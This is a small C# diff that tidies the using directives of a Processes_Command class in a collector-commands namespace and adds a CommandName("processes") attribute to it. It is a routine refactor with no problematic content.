@@ -1,15 +1,13 @@
-﻿using System;
-using System.Collections.Generic;
+﻿using Common.Attributes;
+using System;
 using System.Diagnostics;
-using System.Linq;
 using System.Net.Sockets;
 using System.Runtime.Serialization;
-using System.Text;
-using System.Threading.Tasks;
 
 namespace Common.Commands.Collector_Commands
 {
     [Serializable]
+    [CommandName("processes")]
     public class Processes_Command : Command
     {
         public void execute(Socket sendTo)
